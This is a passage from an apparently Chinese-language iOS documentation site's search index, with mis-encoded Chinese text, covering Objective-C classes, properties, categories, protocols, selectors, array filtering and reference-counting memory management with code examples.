è¿­ä»£å™¨éå†ï¼š\nNSMutableArray *mutableArray = [NSMutableArray array]; NSEnumerator *enumerator = [randomArray objectEnumerator]; id obj = nil; while ((obj = [enumerator nextObject]) != nil) {  if (testObj(obj)) {  [mutableArray addObject:obj];  } } ä½¿ç”¨ predicateï¼š\nNSArray *filteredArray2 = [randomArray filteredArrayUsingPredicate:[NSPredicate predicateWithBlock:^BOOL(id obj, NSDictionary *bindings) {  return testObj(obj); }]]; ä¸Šé¢çš„ä¸ƒç§æ–¹æ³•æ€§èƒ½ç”±é«˜åˆ°ä½é€’å‡ï¼š\n indexesOfObjectsWithOptions:NSEnumerationConcurrent \u0026gt; NSFastEnumeration \u0026gt; enumerateObjectsUsingBlock: \u0026gt; objectAtIndex: \u0026gt; NSEnumerator \u0026gt; filteredArrayUsingPredicate:  NSDictionary / NSMutableDictionary #  "},{"id":25,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/11.runloop/","title":"11. Run Loop","section":"Objective-C\u0026SDK","content":" å‚è€ƒï¼š\n https://stackoverflow.com/questions/7222449/nsdefaultrunloopmode-vs-nsrunloopcommonmodes https://hit-alibaba.github.io/interview/iOS/ObjC-Basic/Runloop.html https://blog.ibireme.com/2015/05/18/runloop/  å®˜æ–¹æ–‡æ¡£ï¼š\n https://developer.apple.com/documentation/foundation/nsrunloop?language=objc   "},{"id":26,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/2.%E7%B1%BB/","title":"2.ç±»","section":"Objective-C\u0026SDK","content":"ç±» #  æ¦‚è¿° #  Objective-C ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§æ–‡ä»¶ç±»å‹ï¼š\n   æ‰©å±•å å†…å®¹ç±»å‹     .h å¤´æ–‡ä»¶ã€‚å¤´æ–‡ä»¶åŒ…å«ç±»ï¼Œç±»å‹ï¼Œå‡½æ•°å’Œå¸¸æ•°çš„å£°æ˜ã€‚   .m æºä»£ç æ–‡ä»¶ã€‚è¿™æ˜¯å…¸å‹çš„æºä»£ç æ–‡ä»¶æ‰©å±•åï¼Œå¯ä»¥åŒ…å« Objective-C å’Œ C ä»£ç ã€‚   .mm æºä»£ç æ–‡ä»¶ã€‚å¸¦æœ‰è¿™ç§æ‰©å±•åçš„æºä»£ç æ–‡ä»¶ï¼Œè¿˜å¯ä»¥åŒ…å« C++ ä»£ç ã€‚\nä»…åœ¨ä½ çš„ Objective-C ä»£ç ä¸­ç¡®å®éœ€è¦ä½¿ç”¨ C++ ç±»æˆ–è€…ç‰¹æ€§çš„æ—¶å€™æ‰ç”¨è¿™ç§æ‰©å±•åã€‚    æ–°å»ºç±»æ–‡ä»¶ï¼Œåœ¨ xcode ä¸­ä½¿ç”¨å¿«æ·é”® command + Nã€‚å¯è§å®ƒåˆ›å»ºäº†ä¸€ä¸‹çš„ä¸¤ä¸ªæ–‡ä»¶ï¼š\n// Person.h #import \u0026lt;Foundation/Foundation.h\u0026gt;  NS_ASSUME_NONNULL_BEGIN  @interface Person : NSObject  @end  NS_ASSUME_NONNULL_END // Person.m #import \u0026#34;Person.h\u0026#34;  @implementation Person  @end ä¸‹é¢ç”±è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå±•å¼€ä»‹ç»ä¸€ä¸‹ OC çš„å†…å®¹ï¼š\n  Objective-C çš„ç±»è§„æ ¼è¯´æ˜åŒ…å«äº†ä¸¤ä¸ªéƒ¨åˆ†ï¼šå®šä¹‰ï¼ˆinterfaceï¼‰ä¸å®ç°ï¼ˆimplementationï¼‰ã€‚\n å®šä¹‰ï¼ˆinterfaceï¼‰éƒ¨åˆ†åŒ…å«äº†ç±»å£°æ˜å’Œå®ä¾‹å˜é‡çš„å®šä¹‰ï¼Œä»¥åŠç±»ç›¸å…³çš„æ–¹æ³•ã€‚ å®ç°ï¼ˆimplementationï¼‰éƒ¨åˆ†åŒ…å«äº†ç±»æ–¹æ³•çš„å®é™…ä»£ç ã€‚    NSObjectï¼šNSObject æ˜¯å¤§éƒ¨åˆ† OC ç±»ç»§æ‰¿ä½“ç³»çš„æ ¹ç±»ã€‚\nè¿™ä¸ªç±»æä¾›äº†ä¸€äº›é€šç”¨çš„æ–¹æ³•ï¼Œæ¯”å¦‚å¯¹è±¡çš„åˆ›å»ºä¸åˆå§‹åŒ–æ–¹æ³•ã€‚å¯¹è±¡é€šè¿‡ç»§æ‰¿ NSObjectï¼Œå¯ä»¥ä»å…¶ä¸­ç»§æ‰¿è®¿é—®è¿è¡Œæ—¶çš„æ¥å£ï¼Œå¹¶è®©å¯¹è±¡å…·å¤‡ OC å¯¹è±¡çš„åŸºæœ¬èƒ½åŠ›ï¼š\n@interface NSObject \u0026lt;NSObject\u0026gt;  //instancetypeï¼šè¿”å›ç»“æœä»¥æ–¹æ³•æ‰€åœ¨çš„ç±»ä¸ºç±»å‹ - (instancetype)init;\t//åˆå§‹åŒ–å¯¹è±¡ + (instancetype)alloc;\t//ç±»æ–¹æ³•ï¼Œåˆ›å»ºä¸åˆ†é…å†…å­˜ç©ºé—´ + (instancetype)new;\t//ç­‰ä»·äº alloc + init  @end   å¦‚ä½•åˆ›å»ºå¹¶åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼š\nNSObject *obj = [[NSObject alloc] init];  Person *person = [[Person alloc] init];\t// è¿™ç±»ä¼¼äº Person.alloc().init()   æˆå‘˜å˜é‡ #  æˆå‘˜å®šä¹‰ #  æˆå‘˜å®šä¹‰çš„ä½ç½®æ˜¯åœ¨ç±»å®šä¹‰æœ€å¼€å§‹çš„ä¸€ä¸ªèŠ±æ‹¬å·ä¸­ï¼š\n@interface ClassName : ItsSuperclass {  // Instance variable declarations. } // Method and property declarations. @end æ¯”å¦‚ä¸‹é¢çš„ä¸€ä¸ªä¾‹å­ï¼š\n@interface Person : NSObject {  NSString *_name;\t// NSString æ˜¯ OC ä¸­çš„å­—ç¬¦ä¸²  NSInteger _age;\t// NSInteger æ˜¯ OC ä¸­çš„æ•´å‹ } @end å˜é‡ä½œç”¨åŸŸ #  ä¸ c++ ä¸­ç±»ä¼¼ï¼Œæˆå‘˜å˜é‡ä¹Ÿæœ‰è®¿é—®æ§åˆ¶æœºåˆ¶ï¼Œé™¤äº† @publicã€@protectedã€@public ä¸‰ç§è®¿é—®æ§åˆ¶ä¹‹å¤–ï¼Œè¿˜æœ‰ç¬¬å››ç§ @packageï¼š\n è¢«å£°æ˜ä¸º @package çš„å˜é‡ï¼Œåœ¨å®ç°è¿™ä¸ªç±»çš„å¯æ‰§è¡Œé•œåƒä¸­è¡¨ç°ä¸º @publicï¼ˆå¯ä»¥ç›´æ¥è®¿é—®ï¼‰ï¼Œå¯¹å¤–åˆ™è¡¨ç°ä¸º @privateï¼ˆä¸å¯ä»¥è®¿é—®ï¼‰ï¼› å®ƒç±»ä¼¼äºå¯¹ c++ ä¸­çš„ private å…³é”®å­—çš„æ‰©å±•ï¼Œå¦‚æœå¤–éƒ¨å°è¯•è®¿é—®è¢«å£°æ˜ä¸º @package çš„å˜é‡ï¼Œåˆ™ä¼šå¯¼è‡´ç¼–è¯‘å™¨çš„è¿æ¥é”™è¯¯ï¼›  æˆå‘˜æ–¹æ³• #  å®šä¹‰æ–¹æ³• #  æˆ‘ä»¬ä¸‹é¢åˆ—ä¸¾ä¸€ä¸ªæ–¹æ³•çš„å®šä¹‰æ¥ä»‹ç»ä¸€ä¸ªæ–¹æ³•å®šä¹‰çš„å®Œæ•´ç»“æ„ï¼š\n@interface Person : NSObject {NSString *_name; NSInteger _age;}  - (instancetype)initWithName:(NSString *)name andAge:(NSInteger)age;  + (instancetype)personWithName:(NSString *)name andAge:(NSInteger)age;  @end  ç¬¬ä¸€ä¸ªéƒ¨åˆ†æ˜¯ +/-ï¼š  åŠ å·ï¼ˆ+ï¼‰ä»£è¡¨ç±»æ–¹æ³•ï¼ˆclass methodï¼‰ï¼Œä¸éœ€è¦å®ä¾‹å°±å¯ä»¥è°ƒç”¨ï¼Œä¸C++ çš„é™æ€å‡½æ•°ç›¸ä¼¼ï¼› å‡å·ï¼ˆ-ï¼‰å³æ˜¯ä¸€èˆ¬çš„å®ä¾‹æ–¹æ³•ï¼ˆinstance methodï¼‰ï¼›   ç¬¬äºŒä¸ªéƒ¨åˆ†æ˜¯ (instancetype) æŒ‡æ˜æ–¹æ³•çš„è¿”å›å€¼ç±»å‹ï¼› Objective-C çš„å‡½æ•°åå¯ä»¥åˆ†å¼€å†™ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸Šé¢å®šä¹‰çš„å‡½æ•°åå®é™…ä¸º initWithNameandAgeï¼›ï¼ˆè¿™ä¸ªè¯­æ³•ç®€ç›´å¤ªé¬¼ç•œäº†ï¼‰ å‡½æ•°çš„å‚æ•°åˆ™æ˜¯å†’å·åå®šä¹‰çš„å‚æ•°ç±»å‹å’Œå‚æ•°åï¼Œä¸Šé¢å®šä¹‰çš„æ˜¯ name ä¸ ageï¼›  å®ç°æ–¹æ³• #  ä¸‹é¢æ˜¯ä¸€ä¸ªä¸Šé¢æ–¹æ³•çš„å®ç°ï¼š\n- (instancetype)initWithName:(NSString *)name andAge:(NSInteger)age {  self = [super init];  if (self) {  _name = name;  _age = age;  }  return self; }  super å…³é”®è¯æ˜¯ä¸€ä¸ªç¼–è¯‘å™¨ç¬¦å·ï¼Œç”¨äºè°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼› self ä»£æŒ‡å¯¹è±¡æœ¬èº«ï¼›  ä¸‹é¢æ˜¯ç¬¬äºŒä¸ªæ–¹æ³•çš„å®ç°ï¼š\n+ (instancetype)personWithName:(NSString *)name andAge:(NSInteger)age {  Person *person = [[Person alloc] initWithName:name andAge:age];  return person; } è°ƒç”¨æ–¹æ³• #  å…¶å®åœ¨ç¬¬äºŒä¸ªæ–¹æ³•å®ç°çš„è¿‡ç¨‹ä¸­å·²ç»ç”¨åˆ°äº†ç›¸å…³æ–¹æ³• çš„è°ƒç”¨ã€‚\nå› ä¸ºç¬¬äºŒä¸ªæ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼å¯¹æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼š\nPerson *person1 = [[Person alloc] initWithName:@\u0026#34;å°æ˜\u0026#34; andAge:18]; å…¶ä»–è¡¥å…… #  å¦‚ä½•åœ¨æ–¹æ³•å¤–è®¿é—®ç±»çš„æˆå‘˜ï¼Ÿ\n åŒ c++/java ä¸€æ ·ï¼Œåªèƒ½é€šè¿‡å®šä¹‰ Setter ä¸ Getter æ–¹æ³•ã€‚ ä¸ºäº†é¿å…å¤§é‡çš„å†—ä½™ä»£ç ï¼Œæˆ‘ä»¬å¼•å…¥äº†å±æ€§çš„æ¦‚å¿µã€‚  å±æ€§ Property #  å®šä¹‰å±æ€§ #  ä»€ä¹ˆæ˜¯å±æ€§ï¼Ÿ\n å¦‚æœä½ å®šä¹‰ä¸ªåä¸º member çš„å±æ€§ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆåä¸º _member çš„æˆå‘˜å˜é‡ï¼› ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä¸ºå£°æ˜ä¸ºå±æ€§çš„æˆå‘˜å˜é‡æ·»åŠ  Setter ä¸ Getter æ–¹æ³•ã€‚æ¯”å¦‚ member è¿™ä¸ªå±æ€§çš„å¦‚æœè¢«å®šä¹‰ï¼Œåˆ™ä¼šç”Ÿæˆ setterMember ä¸ getterMember è¿™ä¸¤ä¸ªæ–¹æ³•ã€‚  å®šä¹‰ä¸€ä¸ªå±æ€§ï¼Œä¸»è¦é€šè¿‡ä¸‹é¢çš„è¯­æ³•å®ç°ï¼š\n@property (attribute1 [, attribute2, ...]) type name; æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å°†ä¹‹å‰ Person çš„ä¸¤ä¸ªæˆå‘˜å˜é‡å®šä¹‰ä¸ºå±æ€§ï¼š\n@interface Person : NSObject  @property (nonatomic, strong) NSString *name; @property (nonatomic, assign) NSInteger age;  @end å±æ€§ä¿®é¥°ç¬¦ #  æŠŠä¸Šé¢çš„è¯­æ³•ä¸­ï¼Œæ‹¬å·å†…çš„éƒ¨åˆ†ç§°ä½œå±æ€§çš„ä¿®é¥°ç¬¦ï¼ˆæˆ‘ä¸çŸ¥é“åº”è¯¥æ€ä¹ˆç¿»è¯‘äº†ï¼‰ï¼Œé‚£ä¹ˆå®ƒæœ‰ä»¥ä¸‹è¿™äº›é€‰é¡¹å¯ä»¥é€‰æ‹©ï¼š\n å¯å†™æ€§æ§åˆ¶ï¼šè®¾ç½®è¿™ä¸ªå±æ€§ä¸»è¦ç”¨äºæ§åˆ¶ç¼–è¯‘å™¨æ˜¯å¦è‡ªåŠ¨ç”Ÿæˆ Setter æ–¹æ³•ã€‚å®ƒæœ‰ä¸¤ä¸ªå¯é€‰å€¼ readwrite ä¸ readonlyï¼Œå‰è€…æ˜¯é»˜è®¤å€¼ï¼› Setter è¯­æ³•æ§åˆ¶ï¼šä¸ iOS çš„å†…å­˜ç®¡ç†æœºåˆ¶æœ‰å…³ï¼Œè¯¦è§ ARC å†…å­˜ç®¡ç†æœºåˆ¶ï¼› åŸå­æ€§æ§åˆ¶ï¼šatomic ä¸ nonatomic ä¸¤ç§å–å€¼ï¼Œå‰è€…æ˜¯é»˜è®¤å€¼ã€‚å¦‚æœè®¾ç½®ä¸ºå‰è€…ï¼Œåœ¨å¤šçº¿ç¨‹æ“ä½œçš„æ—¶å€™éƒ½ä¼šå–åˆ°ä¸€ä¸ªåŸå­æ€§æ“ä½œä¹‹åçš„å€¼ã€‚  ä½¿ç”¨å±æ€§ #  æ¯”å¦‚æˆ‘ä»¬éœ€è¦è®¿é—®æˆ–è®¾ç½®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§å€¼ï¼Œå¯ä»¥ä½¿ç”¨ä¼ ç»Ÿçš„ c++ ç‚¹è¯­æ³•ï¼š\nPerson *person = [[Person alloc] init]; person.name = @\u0026#34;å°æ˜\u0026#34;;\t//ç‚¹è¯­æ³•è®¾ç½® NSString *name = person.name;\t//ç‚¹è¯­æ³•è®¿é—® ä¹Ÿå¯ä»¥ä½¿ç”¨ Setter å‡½æ•°ä¸ Getter å‡½æ•°ï¼š\n[person setAge:18];\t//Setter æ–¹æ³•è®¾ç½® NSInteger age = [person age];\t//Getter æ–¹æ³•è®¿é—® ç±»åˆ« Category #  ä»€ä¹ˆæ˜¯ç±»åˆ«ï¼Ÿ\n Objective-C å¯ä»¥ä¸ºç°æœ‰çš„ç±»æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œå¹¶ä¸éœ€è¦é€šè¿‡ç»§æ‰¿çš„æ–¹å¼å®ç°ï¼Œä¹Ÿä¸éœ€è¦è®¿é—®åŸç”Ÿä»£ç ï¼Œè¿™ç§åŠ¨æ€ç‰¹å¾ç§°ä¸ºç±»åˆ«ã€‚ é€šè¿‡ç±»åˆ«å¯ä»¥åŠ¨æ€çš„ä¸ºç°æœ‰ç±»æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥å°†ç±»å®šä¹‰æ¨¡å—åŒ–åœ°åˆ†å¸ƒåˆ°å¤šä¸ªç›¸å…³æ–‡ä»¶ä¸­ã€‚  åœ¨ Xcode æ·»åŠ  Objective-C Fileï¼Œå¹¶å°†ç±»å‹è®¾ç½®ä¸º Categoryã€å…¶æŒ‡å®šçš„ç±»è®¾ç½®ä¸º Personã€å°†å…¶åç§°å‘½åä¸º Readã€‚xcode ä¼šè‡ªåŠ¨ç”Ÿæˆä»¥ä¸‹ Person+Read.h ä¸ Person+Read.m ä¸¤ä¸ªæ–‡ä»¶ï¼š\n// Person+Read.h #import \u0026#34;Person.h\u0026#34;  NS_ASSUME_NONNULL_BEGIN  @interface Person (Read)  @end  NS_ASSUME_NONNULL_END // Person+Read.m #import \u0026#34;Person+Read.h\u0026#34;  @implementation Person (Read)  @end PostScriptï¼š\n ç±»åˆ«æ–¹æ³•ä¼šå½±å“æ‰€æœ‰å­ç±»ï¼› å¯ä»¥ä¸ºä¸€ä¸ªç±»å®šä¹‰å¤šä¸ªç±»åˆ«ï¼› ç±»åˆ«æ–¹æ³•ä¼šè¦†ç›–åŸæœ‰çš„ç±»æ–¹æ³•ï¼› å¤šä¸ªç±»åˆ«é‡åæ–¹æ³•ç»“æœä¸ç¡®å®šï¼ˆé¿å…é‡åï¼‰ã€‚  æ‰©å±• Extension #  æ‰©å±•ä¸ç±»åˆ«åŒæ ·æ˜¯ä¸ºäº†è§£å†³ä»£ç çš„å¯æ‰©å±•æ€§é—®é¢˜ï¼Œå®ƒä¸ç±»åˆ«çš„ä¸»è¦åŒºåˆ«æ˜¯ï¼š\n  æ‰©å±•ä»…èƒ½åœ¨åŸå§‹ç±»çš„ .m æ–‡ä»¶ä¸­å®ç°ï¼›\n  æ‰©å±•å¯ä»¥æ·»åŠ æ–°çš„å±æ€§ï¼Œç±»åˆ« â€œä¸è¡Œâ€ï¼›\n  ç±»åˆ«æ˜¯è¿è¡Œæ—¶ç‰¹æ€§ï¼Œæ‰©å±•å±äºç¼–è¯‘å™¨ç‰¹æ€§ã€‚\n  å®é™…ä¸Šå°±æ˜¯åœ¨ .m æ–‡ä»¶ä¸­è¿›è¡Œé¢å¤–çš„å£°æ˜ï¼Œå®ƒä¸ .h æ–‡ä»¶ä¸­è¿›è¡Œå£°æ˜çš„åŒºåˆ«æ˜¯ï¼Œå¤–éƒ¨åªèƒ½å¼•ç”¨å¤´æ–‡ä»¶ä¸­å®šä¹‰çš„å±æ€§ã€æˆå‘˜ã€æ–¹æ³•ç­‰ã€‚\nåè®® Protocol #  å®šä¹‰åè®® #  ä»€ä¹ˆæ˜¯åè®®ï¼Ÿ\n å®šä¹‰å…¬å…±æ¥å£çš„åœ°æ–¹ï¼Œåªè¦ç±»ç”³æ˜éµå®ˆäº†ä¸€ä¸ªåè®®ï¼Œå°±ç­‰äºåœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰äº†åè®®é‡Œçš„æ–¹æ³•ã€‚ åè®®å¯ä»¥å°†ä¸åŒç±»çš„å…±åŒè¡Œä¸ºæŠ½è±¡å‡ºæ¥ï¼Œç±»ä¼¼äº Java é‡Œçš„æ¥å£ï¼Œä½†æ›´åŠ å¼ºå¤§ã€‚  åœ¨ Xcode ä¸­ï¼Œä¸åˆ›å»ºç±»åˆ«ä¸€æ ·çš„æ­¥éª¤ï¼Œå°†æ–‡ä»¶ç±»å‹è®¾ç½®ä¸º Protocol å³å¯ã€‚ä¸ä¹‹å‰çš„å‡ ç§éƒ½ä¸åŒï¼Œxcode åªä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª .h å¤´æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š\n#import \u0026lt;Foundation/Foundation.h\u0026gt;  NS_ASSUME_NONNULL_BEGIN  @protocol PrintProtocol \u0026lt;NSObject\u0026gt;  @end  NS_ASSUME_NONNULL_END ä¸‹é¢æ˜¯ä¸€ä¸ªåè®®å®ç°çš„ä¾‹å­ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªä¾‹å­è§£é‡Šä¸€ä¸‹åè®®å®šä¹‰è¯­æ³•çš„å„ä¸ªéƒ¨åˆ†ï¼š\n@protocol PrintProtocol \u0026lt;NSObject\u0026gt;  @optional @property (nonatomic, strong) NSString *name;  @required - (void)printName;  @end  å£°æ˜ä¸€ä¸ªåè®®çš„å…³é”®è¯æ˜¯ @protocol ä¸ @endï¼›è·Ÿåœ¨å‰è€…åé¢çš„ PrintProtocol æ˜¯åè®®åç§°ï¼› å°–æ‹¬å·è¯­æ³• \u0026lt;NSObject\u0026gt; æ˜¯çˆ¶åè®®ï¼Œæ”¯æŒå¤šç»§æ‰¿ï¼Œé€—å·åˆ†éš”ï¼› @optional ä¸ @requireed æ˜¯æˆå‘˜çš„ä¿®é¥°ç¬¦ï¼Œåˆ†åˆ«æŒ‡æ˜å®ç°è¿™ä¸ªåè®®çš„æ¨¡å—ï¼Œå¯é€‰æˆ–è€…å¿…é¡»åœ°å®ç°ç›¸åº”çš„æˆå‘˜æˆ–å±æ€§ï¼› åè®®ä¸­çš„ property ç›¸å½“äºåªèƒ½å Getter, Setter æ–¹æ³•ã€‚  å®ç°åè®® #  åœ¨å®šä¹‰ç±»çš„æ—¶å€™éœ€è¦é€šè¿‡å°–æ‹¬å·ï¼Œæ¯”å¦‚ä¸‹é¢çš„æ–¹å¼æŒ‡å®šåè®®ï¼š\n@interface Person : NSObject \u0026lt;PrintProtocol\u0026gt; æ­¤å³å®šä¹‰ Person ç»§æ‰¿è‡ª NSObjectï¼Œå¹¶å®ç°åè®® PrintProtocolã€‚\nåŒæ ·å®šä¹‰æ‰©å±•æˆ–ç±»åˆ«æ—¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å°–æ‹¬å·æŒ‡å®šåè®®ï¼Œæ¯”å¦‚ï¼š\n@interface Person (Read) \u0026lt;PrintProtocol\u0026gt; å¦å¤–éœ€è¦åœ¨ .m æ–‡ä»¶ä¸­å®ç°å¯¹åº”çš„æ–¹æ³•ï¼š\n- (void)printName {  NSLog(@\u0026#34;%@\u0026#34;, self.name); } ä¹Ÿå¯ä»¥ç”¨æ³›å‹è¡¨ç¤ºä¸€ä¸ªæ»¡è¶³åè®®çš„ç±»ï¼šid\u0026lt;TargetProtocol\u0026gt;\né€‰æ‹©å™¨ Selector #   å‚è€ƒå®˜æ–¹æ–‡æ¡£\n åœ¨ Objetive-C ä¸­ï¼Œé€‰æ‹©å™¨ selector æœ‰ä¸¤ä¸ªå«ä¹‰ï¼š\n åœ¨æºä»£ç ä¸­ï¼Œå®ƒå¯ä»¥ä»£æŒ‡ä¸€ä¸ªå¯¹è±¡çš„æˆå‘˜æ–¹æ³•ï¼› å¦å¤–ï¼Œåœ¨æºä»£ç å·²ç»ç¼–è¯‘å®Œæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œå®ƒæ˜¯ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦ã€‚è€ƒè™‘åˆ°æ‰§è¡Œæ•ˆç‡ï¼Œç¼–è¯‘å™¨ä¼šæŠ›å¼ƒæºä»£ç ä¸­ç”¨äººç±»å¯è¯»çš„ ASCII è¡¨ç¤ºçš„æ ‡è¯†ç¬¦ï¼Œç”Ÿæˆä¸€ä¸ªå”¯ä¸€æ ‡è¯†å†™å…¥è¡¨æ ¼ä¸­ï¼Œå®ƒä»¬ç±»å‹ä¸º SEL.ï¼›  ä¹Ÿå°±æ˜¯è¯´ï¼Œä»€ä¹ˆæ˜¯ @selectorï¼š\n é€‰æ‹©å™¨å°±æ˜¯åœ¨ Objective-C è¯­è¨€ä¸­ï¼Œå¯¹æ–¹æ³•è¿›è¡Œå”¯ä¸€æ ‡ç¤ºçš„æ ‡è¯†ç¬¦ï¼›  åŸºæœ¬å¸¸ç”¨ç±» #   NSNumber NSStringã€NSMutableString NSArrayã€NSMutableArray NSDictionaryã€NSMutableDictionary NSDataã€NSMutableData  "},{"id":27,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/3.%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","title":"3.å†…å­˜ç®¡ç†","section":"Objective-C\u0026SDK","content":"å†…å­˜ç®¡ç† #  æ¦‚è¿° #  ä¸‰ç§ä¸»è¦çš„å†…å­˜ç®¡ç†æ–¹å¼ï¼š\n æ˜¾ç¤ºå†…å­˜é‡Šæ”¾ï¼šC ä¸­çš„ freeã€C++ ä¸­çš„ deleteï¼› åŸºäºå¼•ç”¨è®¡æ•°ï¼šC++ ä¸­çš„æ™ºèƒ½æŒ‡é’ˆï¼ˆsmart pointerï¼‰ï¼ŒObjective-C ä¸­ä½¿ç”¨çš„æ–¹å¼ï¼› åƒåœ¾å›æ”¶æœºåˆ¶ï¼šJavaã€JavaScriptã€C#ï¼›  OS X (macOS) è¿‡å»æ”¯æŒåƒåœ¾å›æ”¶ï¼Œç°åœ¨å·²ç»åºŸé™¤äº†ã€‚iOS åˆ™ä¸€ç›´ä¸æ”¯æŒåƒåœ¾å›æ”¶ã€‚\nå¼•ç”¨è®¡æ•° #  iOS æ”¯æŒ MRC (Mannul Reference Counting) æ‰‹åŠ¨å¼•ç”¨è®¡æ•°ä¸ ARC (Automatic Reference Counting) è‡ªåŠ¨å¼•ç”¨è®¡æ•°ä¸¤ç§ç®¡ç†æœºåˆ¶ã€‚\nMRC #  æ‰‹åŠ¨å¼•ç”¨è®¡æ•°ä¸»è¦æœ‰ä»¥ä¸‹çš„å‡ ä¸ªç›¸å…³çš„æ“ä½œï¼š\n ç”Ÿæˆï¼ˆåˆ†é…ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å¼•ç”¨è®¡æ•°ç½®ä¸º 1ï¼‰ï¼šallocã€cpoyã€newï¼› æŒæœ‰ï¼ˆå°†ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨è®¡æ•°è‡ªå¢ 1ï¼‰ï¼šretainï¼› é‡Šæ”¾ï¼ˆå°†ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨è®¡æ•°è‡ªå‡ 1ï¼‰ï¼šreleaseã€autoreleaseï¼› åºŸå¼ƒï¼ˆé‡Šæ”¾ä¸€ä¸ªå¯¹è±¡ï¼Œå¼•ç”¨è®¡æ•°é™ä¸º 0 åº”è¯¥åºŸå¼ƒï¼‰ï¼šdeallocï¼› æ˜¾ç¤ºï¼ˆæ˜¾ç¤ºä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼‰ï¼šretainCountã€‚  ä¸ºä»€ä¹ˆè¦å¼•å…¥ autoreleaseï¼Ÿ\n  åœ¨åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™è‡ªåŠ¨æŒ‡æ˜ï¼Œå¦‚æœå¯¹è±¡çš„å¼•ç”¨è®¡æ•°é™ä¸º 0ï¼Œåˆ™è‡ªåŠ¨é‡Šæ”¾è¿™ä¸ªå¯¹è±¡ã€‚\n  æ¯”å¦‚åœ¨æœªä½¿ç”¨ autorelease çš„æ—¶å€™ä¸€ä¸ªä»£ç å¯èƒ½æ˜¯è¿™ä¹ˆå†™çš„ï¼š\n- (People *)createPeople {  People *people = [[People alloc] init];  people.name = @\u0026#34;å°ç‹\u0026#34;;  people.age = 10;  people.male = YES;  return people; }  - (void)func2 {  People *people = [self createPeople];  [people trainingDog];  [people release]; }   Â å¦‚æœä½¿ç”¨äº†è¿™ä¸ªå…³é”®å­—ï¼Œåˆ™ä»£ç ä¼šè¢«å†™æˆè¿™æ ·ï¼š\n- (People *)createPeople {  People *people = [[[People alloc] init] autorelease];  people.name = @\u0026#34;å°ç‹\u0026#34;;  people.age = 10;  people.male = YES;  return people; }  - (void)func2 {  People *people = [self createPeople];  [people trainingDog]; }   ä»€ä¹ˆæ˜¯ AutoReleasePoolï¼Ÿ\n  çº¿ç¨‹åœ¨ä¸€ä¸ª Autorelease Pool çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œçº¿ç¨‹ä»»åŠ¡å®Œæˆåé”€æ¯ï¼Œä¸»çº¿ç¨‹ä¸ä¼šé”€æ¯ï¼›\n  åœ¨ä¸€æ¬¡äº‹ä»¶å¾ªç¯ç»“æŸåï¼ŒAutorelease Pool ä¸­å£°æ˜çš„å˜é‡ä¼šè¢«è‡ªåŠ¨é‡Šæ”¾ï¼›\n  å¦‚æœåœ¨è¿™ä¸ªçº¿ç¨‹ä¸­å®šä¹‰äº†å¤§é‡çš„å˜é‡ï¼Œåœ¨é‡Šæ”¾å˜é‡æ—¶åˆ™ä¼šå¯¼è‡´çŸ­æ—¶é—´çš„å†…å­˜å ç”¨è¿‡é«˜ã€‚æ¯”å¦‚ä¸‹é¢çš„ä»£ç ï¼š\n for (int i = 0; i \u0026lt; 100; i++) {  NSString *fileContents = [NSString stringWithContentsOfURL:urlArray[i] encoding:NSUnicodeStringEncoding error:nil];  NSLog(@\u0026#34;%@\u0026#34;, fileContents);  } ä½¿ç”¨ AutoReleasePool åˆ™å¯ä»¥å†™æˆä¸‹é¢çš„å½¢å¼ï¼š\n for (int i = 0; i \u0026lt; 100; i++) {  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];  NSString *fileContents = [NSString stringWithContentsOfURL:urlArray[i] encoding:NSUnicodeStringEncoding error:nil];  NSLog(@\u0026#34;%@\u0026#34;, fileContents);  [pool release];  } ä¹Ÿå¯ä»¥ç”¨æ¯”è¾ƒè¯­æ³•ç³–çš„å†™æ³•ï¼š\n for (int i = 0; i \u0026lt; 100; i++) {  @autoreleasepool {  NSString *fileContents = [NSString stringWithContentsOfURL:urlArray[i] encoding:NSUnicodeStringEncoding error:nil];  NSLog(@\u0026#34;%@\u0026#34;, fileContents);  }  }   å¦‚ä½•è§£å†³å¾ªç¯å¼•ç”¨ï¼Ÿ\n  å¾ªç¯å¼•ç”¨æŒ‡ä¸¤ä¸ªå¯¹è±¡ç›¸äº’æŒæœ‰ï¼Œå¯¼è‡´æ— æ³•è¢«é‡Šæ”¾çš„çŠ¶æ€ã€‚æ¯”å¦‚ï¼š\n@interface People : NSObjec @property(nonatomic, retain) Dog *dog; @end  